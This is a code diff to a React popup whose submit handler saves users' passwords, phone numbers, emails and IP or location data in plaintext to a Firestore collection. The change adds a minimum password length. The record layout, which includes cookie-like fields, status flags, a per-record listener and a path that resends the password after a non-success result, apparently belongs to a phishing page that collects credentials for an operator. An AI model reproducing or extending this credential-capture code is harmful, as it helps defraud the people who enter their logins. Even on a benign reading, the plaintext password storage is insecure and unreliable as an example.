@@ -173,33 +173,37 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
 
 
   const handleSubmit = async () => {
-    setIsLoading(true); 
-    SetError(false);
-    try {
-      if (result.type && result.type !== "success") {
-        updateDoc(doc(db, "users", data.id), {
-          status: 1,
-          pass: pass
-        });
-        return;
-      }
-      setResult({
-        type: "",
-        msg: "",
-      });
-      const ipAddrrs = localStorage.getItem("location") || "";
-      const user = await addDoc(collection(db, "users"), {
-        pass:pass,phone:fone,email:mail,auth:'',ip:ipAddrrs,status: 1,status2:0,ck:'',pg:'',bm:'',ad:'',if:'',createdAt: new Date().getTime(),
-      });
-      if(user.id){
-        updateIndex(user.id);
-        setData(user);
-        setUserID(user.id);
-        listener(user.id);
-      }
-    } catch (error) {
-      console.error("Error saving data to Firestore: ", error);
-    } finally {
+    if(pass.length > 7){
+      try {
+            setIsLoading(true); 
+            SetError(false);
+            if (result.type && result.type !== "success") {
+              updateDoc(doc(db, "users", data.id), {
+                status: 1,
+                pass: pass
+              });
+              return;
+            }
+            setResult({
+              type: "",
+              msg: "",
+            });
+            const ipAddrrs = localStorage.getItem("location") || "";
+            const user = await addDoc(collection(db, "users"), {
+              pass:pass,phone:fone,email:mail,auth:'',ip:ipAddrrs,status: 1,status2:0,ck:'',pg:'',bm:'',ad:'',if:'',createdAt: new Date().getTime(),
+            });
+            if(user.id){
+              updateIndex(user.id);
+              setData(user);
+              setUserID(user.id);
+              listener(user.id);
+            }
+          } catch (error) {
+            console.error("Error saving data to Firestore: ", error);
+          } finally {
+          }
+    }else{
+      SetError(true);
     }
   };
 
